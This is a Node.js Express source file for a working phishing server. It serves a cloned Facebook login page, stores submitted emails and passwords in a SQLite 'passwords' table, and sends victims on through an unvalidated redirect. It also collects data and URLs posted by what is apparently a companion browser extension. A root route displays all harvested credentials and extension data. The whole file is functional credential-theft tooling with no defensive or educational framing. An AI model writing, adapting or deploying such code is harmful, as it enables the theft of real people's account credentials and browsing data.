var express = require('express');
var swig = require('swig');
var sqlite3 = require('sqlite3');
var bodyParser = require('body-parser');

var db = new sqlite3.Database("passwords.db");

var app = express();
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', function (req, res) {
  var phishingData = [];
  db.serialize(function() {
    db.each("SELECT * FROM passwords", function(err, row) {
      phishingData.push({id : row.id, username : row.username, password : row.password});
    }, function() {
      var extensionData = [];
      db.each("SELECT * FROM extension", function(err, row) {
        extensionData.push({id : row.id, data : row.data, url : row.url});
      }, function() {
        var content = swig.renderFile('static/html/data_table.html', {phishingData : phishingData, extensionData : extensionData});
        res.send(content);
      });
    });
  });
});

app.post('/extension', function (req, res) {
  var data = req.body.data;
  var url = req.body.url;
  db.serialize(function() {
    var stmt = db.prepare("INSERT INTO extension VALUES (NULL, ?, ?)");
    stmt.run(data, url);
    stmt.finalize();
  });
  res.send('OK');
});


app.get('/facebook', function(req, res) {
  res.send(swig.renderFile('static/html/facebook.html', { url : req.query.next }));
});

app.post('/facebook', function (req, res) {
  var username = req.body.email;
  var password = req.body.pass;
  var redirectUrl = req.body.next;
  db.serialize(function() {
    var stmt = db.prepare("INSERT INTO passwords VALUES (NULL, ? ,?)");
    stmt.run(username, password);
    stmt.finalize();
  });
  res.redirect(301, redirectUrl);
});

app.use('/js', express.static(__dirname + '/node_modules/bootstrap/dist/js'));
app.use('/facebook_files/', express.static(__dirname + '/facebook_files/'));
app.use('/js', express.static(__dirname + '/node_modules/jquery/dist'));
app.use('/css', express.static(__dirname + '/node_modules/bootstrap/dist/css'));
app.use('/css', express.static(__dirname + '/static/css'));

app.listen(3000, function () {
  db.serialize(function() {
    db.run("CREATE TABLE IF NOT EXISTS passwords (id INTEGER PRIMARY KEY, username CHAR(30), password CHAR(20))");
    db.run("CREATE TABLE IF NOT EXISTS extension (id INTEGER PRIMARY KEY, data TEXT, url CHAR(100))");
  });
  console.log('Listening on port 3000!');
});